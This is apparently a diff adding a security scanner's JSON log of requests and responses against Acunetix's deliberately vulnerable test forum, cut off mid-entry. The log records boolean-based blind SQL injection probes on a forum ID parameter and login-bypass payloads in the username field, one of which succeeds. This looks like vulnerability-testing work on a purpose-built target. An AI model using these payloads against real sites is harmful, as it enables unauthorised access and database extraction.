+    "set-cookie": "ASPSESSIONID=[REDACTED]; path=/",
+    "x-powered-by": "ASP.NET",
+    "date": "Sun, 04 Oct 2026 18:04:49 GMT",
+    "content-length": "2965"
+   },
+   "body": "\r\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\r\n<html><!-- InstanceBegin template=\"/Templates/MainTemplate.dwt.asp\" codeOutsideHTMLIsLocked=\"false\" -->\r\n<head>\r\n<!-- InstanceBeginEditable name=\"doctitle\" -->\r\n<title>acuforum Miscellaneous</title>\r\n<!-- InstanceEndEditable -->\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\r\n<!-- InstanceBeginEditable name=\"head\" -->\r\n<!-- InstanceEndEditable -->\r\n<link href=\"styles.css\" rel=\"stylesheet\" type=\"text/css\">\r\n</head>\r\n<body> \r\n<table width=\"100%\"  border=\"0\" cellpadding=\"10\" cellspacing=\"0\"> \r\n  <tr bgcolor=\"#008F00\"> \r\n    <td width=\"306px\"><a href=\"https://www.acunetix.com/\"><img src=\"Images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></td> \r\n    <td align=\"right\" valign=\"middle\" bgcolor=\"#008F00\" class=\"disclaimer\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></td> \r\n  </tr> \r\n  <tr> \r\n    <td colspan=\"2\"><div class=\"menubar\"><a href=\"Templatize.asp?item=html/about.html\" class=\"menu\">about</a> - <a href=\"Default.asp\" class=\"menu\">forums</a> - <a href=\"Search.asp\" class=\"menu\">search</a> \r\n     - <a href=\"./Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D2%2BAND%2B1%253D1\" class=\"menu\">login</a> - <a href=\"./Register.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D2%2BAND%2B1%253D1\" class=\"menu\">register</a> \r\n\t- <a href=\"https://www.acunetix.com/vulnerability-scanner/sql-injection/\" class=\"menu\">SQL scanner</a> - <a href=\"https://www.acunetix.com/websitesecurity/sql-injection/\" class=\"menu\">SQL vuln help</a>\r\n    </div></td> \r\n  </tr> \r\n  <tr> \r\n    <td colspan=\"2\"><!-- InstanceBeginEditable name=\"MainContentLeft\" -->\r\n\t<div class=\"path\">\r\n\t\t\tMiscellaneous\r\n\t\t</div>\r\n\t<table width=\"100%\" border=\"0\" cellspacing=\"0\" cellpadding=\"5\">\r\n      <tr>\r\n        <td class=\"tableheader\">Thread</td>\r\n        <td class=\"tableheader\">Posts</td>\r\n\t\t<td class=\"tableheader\">Posted by</td>\r\n        <td class=\"tableheader\">Last Post</td>\r\n      </tr>   \r\n\t\r\n\t</table>\r\n\t\r\n\t<!-- InstanceEndEditable --></td> \r\n  </tr> \r\n  <tr align=\"right\" bgcolor=\"#FFFFFF\"> \r\n    <td colspan=\"2\" class=\"footer\">Copyright 2019 Acunetix Ltd.</td> \r\n  </tr> \r\n</table> \r\n<div style=\"background-color:lightgray;width:80%;margin:auto;left:10%;position:fixed;bottom:2px;text-align:center;font-size:12px;padding:1px\">\r\n\t<p style=\"padding-left:20%;padding-right:20%\"><b>Warning</b>: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</p>\r\n</div>\r\n</body>\r\n<!-- InstanceEnd --></html>\r\n",
+   "size": 2965,
+   "redirect_chain": []
+  },
+  "label": "control_true",
+  "t": 1791137091.209
+ },
+ "pr-0008": {
+  "request": {
+   "method": "GET",
+   "url": "http://testasp.vulnweb.com/showforum.asp?id=2+AND+1%3D2",
+   "headers": {
+    "User-Agent": "Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)",
+    "Cookie": "ASPSESSIONID=[REDACTED]"
+   },
+   "body": ""
+  },
+  "response": {
+   "status": 500,
+   "headers": {
+    "cache-control": "private",
+    "content-type": "text/html",
+    "server": "Microsoft-IIS/8.5",
+    "set-cookie": "ASPSESSIONID=[REDACTED]; path=/",
+    "x-powered-by": "ASP.NET",
+    "date": "Sun, 04 Oct 2026 18:04:49 GMT",
+    "content-length": "1208"
+   },
+   "body": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n<head>\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\"/>\r\n<title>500 - Internal server error.</title>\r\n<style type=\"text/css\">\r\n<!--\r\nbody{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}\r\nfieldset{padding:0 15px 10px 15px;} \r\nh1{font-size:2.4em;margin:0;color:#FFF;}\r\nh2{font-size:1.7em;margin:0;color:#CC0000;} \r\nh3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} \r\n#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:\"trebuchet MS\", Verdana, sans-serif;color:#FFF;\r\nbackground-color:#555555;}\r\n#content{margin:0 0 0 2%;position:relative;}\r\n.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}\r\n-->\r\n</style>\r\n</head>\r\n<body>\r\n<div id=\"header\"><h1>Server Error</h1></div>\r\n<div id=\"content\">\r\n <div class=\"content-container\"><fieldset>\r\n  <h2>500 - Internal server error.</h2>\r\n  <h3>There is a problem with the resource you are looking for, and it cannot be displayed.</h3>\r\n </fieldset></div>\r\n</div>\r\n</body>\r\n</html>\r\n",
+   "size": 1208,
+   "redirect_chain": []
+  },
+  "label": "control_false",
+  "t": 1791137091.558
+ },
+ "pr-0009": {
+  "request": {
+   "method": "GET",
+   "url": "http://testasp.vulnweb.com/showforum.asp?id=2+AND+%40%40version+LIKE+%27%25%27",
+   "headers": {
+    "User-Agent": "Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)",
+    "Cookie": "ASPSESSIONID=[REDACTED]"
+   },
+   "body": ""
+  },
+  "response": {
+   "status": 200,
+   "headers": {
+    "cache-control": "private",
+    "content-type": "text/html",
+    "server": "Microsoft-IIS/8.5",
+    "set-cookie": "ASPSESSIONID=[REDACTED]; path=/",
+    "x-powered-by": "ASP.NET",
+    "date": "Sun, 04 Oct 2026 18:04:50 GMT",
+    "content-length": "3035"
+   },
+   "body": "\r\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\r\n<html><!-- InstanceBegin template=\"/Templates/MainTemplate.dwt.asp\" codeOutsideHTMLIsLocked=\"false\" -->\r\n<head>\r\n<!-- InstanceBeginEditable name=\"doctitle\" -->\r\n<title>acuforum Miscellaneous</title>\r\n<!-- InstanceEndEditable -->\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\r\n<!-- InstanceBeginEditable name=\"head\" -->\r\n<!-- InstanceEndEditable -->\r\n<link href=\"styles.css\" rel=\"stylesheet\" type=\"text/css\">\r\n</head>\r\n<body> \r\n<table width=\"100%\"  border=\"0\" cellpadding=\"10\" cellspacing=\"0\"> \r\n  <tr bgcolor=\"#008F00\"> \r\n    <td width=\"306px\"><a href=\"https://www.acunetix.com/\"><img src=\"Images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></td> \r\n    <td align=\"right\" valign=\"middle\" bgcolor=\"#008F00\" class=\"disclaimer\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></td> \r\n  </tr> \r\n  <tr> \r\n    <td colspan=\"2\"><div class=\"menubar\"><a href=\"Templatize.asp?item=html/about.html\" class=\"menu\">about</a> - <a href=\"Default.asp\" class=\"menu\">forums</a> - <a href=\"Search.asp\" class=\"menu\">search</a> \r\n     - <a href=\"./Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D2%2BAND%2B%2540%2540version%2BLIKE%2B%2527%2525%2527\" class=\"menu\">login</a> - <a href=\"./Register.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D2%2BAND%2B%2540%2540version%2BLIKE%2B%2527%2525%2527\" class=\"menu\">register</a> \r\n\t- <a href=\"https://www.acunetix.com/vulnerability-scanner/sql-injection/\" class=\"menu\">SQL scanner</a> - <a href=\"https://www.acunetix.com/websitesecurity/sql-injection/\" class=\"menu\">SQL vuln help</a>\r\n    </div></td> \r\n  </tr> \r\n  <tr> \r\n    <td colspan=\"2\"><!-- InstanceBeginEditable name=\"MainContentLeft\" -->\r\n\t<div class=\"path\">\r\n\t\t\tMiscellaneous\r\n\t\t</div>\r\n\t<table width=\"100%\" border=\"0\" cellspacing=\"0\" cellpadding=\"5\">\r\n      <tr>\r\n        <td class=\"tableheader\">Thread</td>\r\n        <td class=\"tableheader\">Posts</td>\r\n\t\t<td class=\"tableheader\">Posted by</td>\r\n        <td class=\"tableheader\">Last Post</td>\r\n      </tr>   \r\n\t\r\n\t</table>\r\n\t\r\n\t<!-- InstanceEndEditable --></td> \r\n  </tr> \r\n  <tr align=\"right\" bgcolor=\"#FFFFFF\"> \r\n    <td colspan=\"2\" class=\"footer\">Copyright 2019 Acunetix Ltd.</td> \r\n  </tr> \r\n</table> \r\n<div style=\"background-color:lightgray;width:80%;margin:auto;left:10%;position:fixed;bottom:2px;text-align:center;font-size:12px;padding:1px\">\r\n\t<p style=\"padding-left:20%;padding-right:20%\"><b>Warning</b>: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</p>\r\n</div>\r\n</body>\r\n<!-- InstanceEnd --></html>\r\n",
+   "size": 3035,
+   "redirect_chain": []
+  },
+  "label": "version_true",
+  "t": 1791137091.919
+ },
+ "pr-0010": {
+  "request": {
+   "method": "GET",
+   "url": "http://testasp.vulnweb.com/showforum.asp?id=2+AND+%40%40version+LIKE+%27zzz-sentinel-nope%25%27",
+   "headers": {
+    "User-Agent": "Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)",
+    "Cookie": "ASPSESSIONID=[REDACTED]"
+   },
+   "body": ""
+  },
+  "response": {
+   "status": 500,
+   "headers": {
+    "cache-control": "private",
+    "content-type": "text/html",
+    "server": "Microsoft-IIS/8.5",
+    "set-cookie": "ASPSESSIONID=[REDACTED]; path=/",
+    "x-powered-by": "ASP.NET",
+    "date": "Sun, 04 Oct 2026 18:04:50 GMT",
+    "content-length": "1208"
+   },
+   "body": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n<head>\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\"/>\r\n<title>500 - Internal server error.</title>\r\n<style type=\"text/css\">\r\n<!--\r\nbody{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}\r\nfieldset{padding:0 15px 10px 15px;} \r\nh1{font-size:2.4em;margin:0;color:#FFF;}\r\nh2{font-size:1.7em;margin:0;color:#CC0000;} \r\nh3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} \r\n#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:\"trebuchet MS\", Verdana, sans-serif;color:#FFF;\r\nbackground-color:#555555;}\r\n#content{margin:0 0 0 2%;position:relative;}\r\n.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}\r\n-->\r\n</style>\r\n</head>\r\n<body>\r\n<div id=\"header\"><h1>Server Error</h1></div>\r\n<div id=\"content\">\r\n <div class=\"content-container\"><fieldset>\r\n  <h2>500 - Internal server error.</h2>\r\n  <h3>There is a problem with the resource you are looking for, and it cannot be displayed.</h3>\r\n </fieldset></div>\r\n</div>\r\n</body>\r\n</html>\r\n",
+   "size": 1208,
+   "redirect_chain": []
+  },
+  "label": "version_false",
+  "t": 1791137092.275
+ },
+ "pr-0011": {
+  "request": {
+   "method": "GET",
+   "url": "http://testasp.vulnweb.com/showforum.asp?id=2+AND+SUBSTRING%28%40%40version%2C1%2C1%29%3D%278%27",
+   "headers": {
+    "User-Agent": "Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)",
+    "Cookie": "ASPSESSIONID=[REDACTED]"
+   },
+   "body": ""
+  },
+  "response": {
+   "status": 500,
+   "headers": {
+    "cache-control": "private",
+    "content-type": "text/html",
+    "server": "Microsoft-IIS/8.5",
+    "set-cookie": "ASPSESSIONID=[REDACTED]; path=/",
+    "x-powered-by": "ASP.NET",
+    "date": "Sun, 04 Oct 2026 18:04:50 GMT",
+    "content-length": "1208"
+   },
+   "body": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n<head>\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\"/>\r\n<title>500 - Internal server error.</title>\r\n<style type=\"text/css\">\r\n<!--\r\nbody{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}\r\nfieldset{padding:0 15px 10px 15px;} \r\nh1{font-size:2.4em;margin:0;color:#FFF;}\r\nh2{font-size:1.7em;margin:0;color:#CC0000;} \r\nh3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} \r\n#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:\"trebuchet MS\", Verdana, sans-serif;color:#FFF;\r\nbackground-color:#555555;}\r\n#content{margin:0 0 0 2%;position:relative;}\r\n.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}\r\n-->\r\n</style>\r\n</head>\r\n<body>\r\n<div id=\"header\"><h1>Server Error</h1></div>\r\n<div id=\"content\">\r\n <div class=\"content-container\"><fieldset>\r\n  <h2>500 - Internal server error.</h2>\r\n  <h3>There is a problem with the resource you are looking for, and it cannot be displayed.</h3>\r\n </fieldset></div>\r\n</div>\r\n</body>\r\n</html>\r\n",
+   "size": 1208,
+   "redirect_chain": []
+  },
+  "label": "version_digit_8",
+  "t": 1791137092.624
+ },
+ "pr-0012": {
+  "request": {
+   "method": "GET",
+   "url": "http://testasp.vulnweb.com/showforum.asp?id=2+AND+SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27",
+   "headers": {
+    "User-Agent": "Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)",
+    "Cookie": "ASPSESSIONID=[REDACTED]"
+   },
+   "body": ""
+  },
+  "response": {
+   "status": 500,
+   "headers": {
+    "cache-control": "private",
+    "content-type": "text/html",
+    "server": "Microsoft-IIS/8.5",
+    "set-cookie": "ASPSESSIONID=[REDACTED]; path=/",
+    "x-powered-by": "ASP.NET",
+    "date": "Sun, 04 Oct 2026 18:04:51 GMT",
+    "content-length": "1208"
+   },
+   "body": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n<head>\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\"/>\r\n<title>500 - Internal server error.</title>\r\n<style type=\"text/css\">\r\n<!--\r\nbody{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}\r\nfieldset{padding:0 15px 10px 15px;} \r\nh1{font-size:2.4em;margin:0;color:#FFF;}\r\nh2{font-size:1.7em;margin:0;color:#CC0000;} \r\nh3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} \r\n#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:\"trebuchet MS\", Verdana, sans-serif;color:#FFF;\r\nbackground-color:#555555;}\r\n#content{margin:0 0 0 2%;position:relative;}\r\n.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}\r\n-->\r\n</style>\r\n</head>\r\n<body>\r\n<div id=\"header\"><h1>Server Error</h1></div>\r\n<div id=\"content\">\r\n <div class=\"content-container\"><fieldset>\r\n  <h2>500 - Internal server error.</h2>\r\n  <h3>There is a problem with the resource you are looking for, and it cannot be displayed.</h3>\r\n </fieldset></div>\r\n</div>\r\n</body>\r\n</html>\r\n",
+   "size": 1208,
+   "redirect_chain": []
+  },
+  "label": "version_digit_5",
+  "t": 1791137092.944
+ },
+ "pr-0013": {
+  "request": {
+   "method": "POST",
+   "url": "http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum.asp%3Fid%3D0",
+   "headers": {
+    "User-Agent": "Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Cookie": "ASPSESSIONID=[REDACTED]"
+   },
+   "body": "tfUName=1%27+OR+%271%27%3D%271%27+--&tfUPass=sentinel"
+  },
+  "response": {
+   "status": 200,
+   "headers": {
+    "cache-control": "private",
+    "content-type": "text/html",
+    "server": "Microsoft-IIS/8.5",
+    "x-powered-by": "ASP.NET",
+    "date": "Sun, 04 Oct 2026 18:04:51 GMT",
+    "content-length": "6151"
+   },
+   "body": "\r\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\r\n<html><!-- InstanceBegin template=\"/Templates/MainTemplate.dwt.asp\" codeOutsideHTMLIsLocked=\"false\" -->\r\n<head>\r\n<!-- InstanceBeginEditable name=\"doctitle\" -->\r\n<title>acuforum Acunetix Web Vulnerability Scanner</title>\r\n<!-- InstanceEndEditable -->\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\r\n<!-- InstanceBeginEditable name=\"head\" -->\r\n<!-- InstanceEndEditable -->\r\n<link href=\"styles.css\" rel=\"stylesheet\" type=\"text/css\">\r\n</head>\r\n<body> \r\n<table width=\"100%\"  border=\"0\" cellpadding=\"10\" cellspacing=\"0\"> \r\n  <tr bgcolor=\"#008F00\"> \r\n    <td width=\"306px\"><a href=\"https://www.acunetix.com/\"><img src=\"Images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></td> \r\n    <td align=\"right\" valign=\"middle\" bgcolor=\"#008F00\" class=\"disclaimer\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></td> \r\n  </tr> \r\n  <tr> \r\n    <td colspan=\"2\"><div class=\"menubar\"><a href=\"Templatize.asp?item=html/about.html\" class=\"menu\">about</a> - <a href=\"Default.asp\" class=\"menu\">forums</a> - <a href=\"Search.asp\" class=\"menu\">search</a> \r\n     - <a href=\"./Logout.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0\" class=\"menu\">logout 1' OR '1'='1' --</a> \r\n\t- <a href=\"https://www.acunetix.com/vulnerability-scanner/sql-injection/\" class=\"menu\">SQL scanner</a> - <a href=\"https://www.acunetix.com/websitesecurity/sql-injection/\" class=\"menu\">SQL vuln help</a>\r\n    </div></td> \r\n  </tr> \r\n  <tr> \r\n    <td colspan=\"2\"><!-- InstanceBeginEditable name=\"MainContentLeft\" -->\r\n\t<div class=\"path\">\r\n\t\t\tAcunetix Web Vulnerability Scanner\r\n\t\t</div>\r\n\t<table width=\"100%\" border=\"0\" cellspacing=\"0\" cellpadding=\"5\">\r\n      <tr>\r\n        <td class=\"tableheader\">Thread</td>\r\n        <td class=\"tableheader\">Posts</td>\r\n\t\t<td class=\"tableheader\">Posted by</td>\r\n        <td class=\"tableheader\">Last Post</td>\r\n      </tr>   \r\n\t<tr bgcolor='#FFFFFF'><td><div class='threadtitle'><a href='showthread.asp?id=0'>1</a></div></td><td>1</td><td>admin</td><td>11/9/2005 12:16:25 PM</td></tr><tr bgcolor='#e9ffe9'><td><div class='threadtitle'><a href='showthread.asp?id=1'>2</a></div></td><td>1</td><td>admin</td><td>11/9/2005 12:16:28 PM</td></tr><tr bgcolor='#FFFFFF'><td><div class='threadtitle'><a href='showthread.asp?id=2'>3</a></div></td><td>2</td><td>admin</td><td>11/9/2005 1:08:52 PM</td></tr><tr bgcolor='#e9ffe9'><td><div class='threadtitle'><a href='showthread.asp?id=3'>aaa</a></div></td><td>1</td><td>admin</td><td>11/9/2005 1:45:54 PM</td></tr><tr bgcolor='#FFFFFF'><td><div class='threadtitle'><a href='showthread.asp?id=4'>tripscan — практический разбор возможностей сервиса для планирования поездок</a></div></td><td>1</td><td>NicholasevozY</td><td>10/4/2026 5:39:34 PM</td></tr><tr bgcolor='#e9ffe9'><td><div class='threadtitle'><a href='showthread.asp?id=5'>tripscan — Пошаговый разбор : от первой поездки до сложных маршрутов</a></div></td><td>1</td><td>ThomasHusia</td><td>10/4/2026 5:39:55 PM</td></tr><tr bgcolor='#FFFFFF'><td><div class='threadtitle'><a href='showthread.asp?id=6'>tripscan — в ежедневном режиме: как устроена повседневная работа с сервисом</a></div></td><td>1</td><td>Victorinpub</td><td>10/4/2026 5:45:23 PM</td></tr><tr bgcolor='#e9ffe9'><td><div class='threadtitle'><a href='showthread.asp?id=7'>Compare Gift Cards</a></div></td><td>1</td><td>LloydObems</td><td>10/4/2026 5:53:27 PM</td></tr><tr bgcolor='#FFFFFF'><td><div class='threadtitle'><a href='showthread.asp?id=8'>Compare Gift Cards</a></div></td><td>1</td><td>JamesBrins</td><td>10/4/2026 5:53:27 PM</td></tr><tr bgcolor='#e9ffe9'><td><div class='threadtitle'><a href='showthread.asp?id=9'>Кракен сайт вход недорогой кракен велосипед отзывы</a></div></td><td>1</td><td>DmuiApamy</td><td>10/4/2026 5:55:55 PM</td></tr>\r\n\t</table>\r\n\t\r\n      <!-- tinyMCE -->\r\n      <script language=\"jav",
+   "size": 5939,
+   "redirect_chain": [
+    [
+     302,
+     "http://testasp.vulnweb.com/showforum.asp?id=0"
+    ]
+   ]
+  },
+  "label": "control_true",
+  "t": 1791137093.254
+ },
+ "pr-0014": {
+  "request": {
+   "method": "POST",
+   "url": "http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum.asp%3Fid%3D0",
+   "headers": {
+    "User-Agent": "Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Cookie": "ASPSESSIONID=[REDACTED]"
+   },
+   "body": "tfUName=1%27+OR+%271%27%3D%272%27+--&tfUPass=sentinel"
+  },
+  "response": {
+   "status": 200,
+   "headers": {
+    "cache-control": "private",
+    "content-type": "text/html",
+    "server": "Microsoft-IIS/8.5",
+    "set-cookie": "ASPSESSIONID=[REDACTED]; path=/",
+    "x-powered-by": "ASP.NET",
+    "date": "Sun, 04 Oct 2026 18:04:52 GMT",
+    "content-length": "3235"
+   },
+   "body": "\r\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\r\n<html><!-- InstanceBegin template=\"/Templates/MainTemplate.dwt.asp\" codeOutsideHTMLIsLocked=\"false\" -->\r\n<head>\r\n<!-- InstanceBeginEditable name=\"doctitle\" -->\r\n<title>acuforum login</title>\r\n<!-- InstanceEndEditable -->\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\r\n<!-- InstanceBeginEditable name=\"head\" -->\r\n<!-- InstanceEndEditable -->\r\n<link href=\"styles.css\" rel=\"stylesheet\" type=\"text/css\">\r\n</head>\r\n<body> \r\n<table width=\"100%\"  border=\"0\" cellpadding=\"10\" cellspacing=\"0\"> \r\n  <tr bgcolor=\"#008F00\"> \r\n    <td width=\"306px\"><a href=\"https://www.acunetix.com/\"><img src=\"Images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></td> \r\n    <td align=\"right\" valign=\"middle\" bgcolor=\"#008F00\" class=\"disclaimer\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></td> \r\n  </tr> \r\n  <tr> \r\n    <td colspan=\"2\"><div class=\"menubar\"><a href=\"Templatize.asp?item=html/about.html\" class=\"menu\">about</a> - <a href=\"Default.asp\" class=\"menu\">forums</a> - <a href=\"Search.asp\" class=\"menu\">search</a> \r\n     - <a href=\"./Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0\" class=\"menu\">login</a> - <a href=\"./Register.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0\" class=\"menu\">register</a> \r\n\t- <a href=\"https://www.acunetix.com/vulnerability-scanner/sql-injection/\" class=\"menu\">SQL scanner</a> - <a href=\"https://www.acunetix.com/websitesecurity/sql-injection/\" class=\"menu\">SQL vuln help</a>\r\n    </div></td> \r\n  </tr> \r\n  <tr> \r\n    <td colspan=\"2\"><!-- InstanceBeginEditable name=\"MainContentLeft\" -->\r\n\t\t<form action=\"\" method=\"POST\">\r\n\t\t<table width=\"350\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"5\" class=\"FramedForm\">\r\n            <tr>\r\n              <td>Username:</td>\r\n              <td align=\"right\"><input name=\"tfUName\" type=\"text\" class=\"Login\" id=\"tfUName\"></td>\r\n            </tr>\r\n            <tr>\r\n              <td>Password:</td>\r\n              <td align=\"right\"><input name=\"tfUPass\" type=\"password\" class=\"Login\" id=\"tfUPass\"></td>\r\n            </tr>\r\n            <tr>\r\n              <td>&nbsp;</td>\r\n              <td align=\"right\"><input type=\"submit\" value=\"Login\"></td>\r\n            </tr>\r\n          </table>\r\n\t  </form>\r\n\t\t  <b>Invalid login!</b>\r\n    <!-- InstanceEndEditable --></td> \r\n  </tr> \r\n  <tr align=\"right\" bgcolor=\"#FFFFFF\"> \r\n    <td colspan=\"2\" class=\"footer\">Copyright 2019 Acunetix Ltd.</td> \r\n  </tr> \r\n</table> \r\n<div style=\"background-color:lightgray;width:80%;margin:auto;text-align:center;font-size:12px;padding:1px\">\r\n\t<p style=\"padding-left:20%;padding-right:20%\"><b>Warning</b>: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</p>\r\n</div>\r\n</body>\r\n<!-- InstanceEnd --></html>\r\n",
+   "size": 3235,
+   "redirect_chain": []
+  },
+  "label": "control_false",
+  "t": 1791137094.06
+ },
+ "pr-0015": {
+  "request": {
+   "method": "POST",
+   "url": "http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum.asp%3Fid%3D0",
+   "headers": {
+    "User-Agent": "Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Cookie": "ASPSESSIONID=[REDACTED]"
+   },
+   "body": "tfUName=1%27+OR+%40%40version+LIKE+%27%25%27+--&tfUPass=sentinel"
+  },
+  "response": {
+   "status": 200,
+   "headers": {
+    "cache-control": "private",
+    "content-type": "text/html",
+    "server": "Microsoft-IIS/8.5",
+    "x-powered-by": "ASP.NET",
+    "date": "Sun, 04 Oct 2026 18:04:52 GMT",
+    "content-length": "6162"
+   },
+   "body": "\r\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\">\r\n<html><!-- InstanceBegin template=\"/Templates/MainTemplate.dwt.asp\" codeOutsideHTMLIsLocked=\"false\" -->\r\n<head>\r\n<!-- InstanceBeginEditable name=\"doctitle\" -->\r\n<title>acuforum Acunetix Web Vulnerability Scanner</title>\r\n<!-- InstanceEndEditable -->\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\r\n<!-- InstanceBeginEditable name=\"head\" -->\r\n<!-- InstanceEndEditable -->\r\n<link href=\"styles.css\" rel=\"stylesheet\" type=\"text/css\">\r\n</head>\r\n<body> \r\n<table width=\"100%\"  border=\"0\" cellpadding=\"10\" cellspacing=\"0\"> \r\n  <tr bgcolor=\"#008F00\"> \r\n    <td width=\"306px\"><a href=\"https://www.acunetix.com/\"><img src=\"Images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></td> \r\n    <td align=\"right\" valign=\"middle\" bgcolor=\"#008F00\" class=\"disclaimer\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></td> \r\n  </tr> \r\n  <tr> \r\n    <td colspan=\"2\"><div class=\"menubar\"><a href=\"Templatize.asp?item=html/about.html\" class=\"menu\">about</a> - <a href=\"Default.asp\" class=\"menu\">forums</a> - <a href=\"Search.asp\" class=\"menu\">search</a> \r\n     - <a href=\"./Logout.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0\" class=\"menu\">logout 1' OR @@version LIKE '%' --</a> \r\n\t- <a href=\"https://www.acunetix.com/vulnerability-scanner/sql-injection/\" class=\"menu\">SQL scanner</a> - <a href=\"https://www.acunetix.com/websitesecurity/sql-injection/\" class=\"menu\">SQL vuln help</a>\r\n    </div></td> \r\n  </tr> \r\n  <tr> \r\n    <td 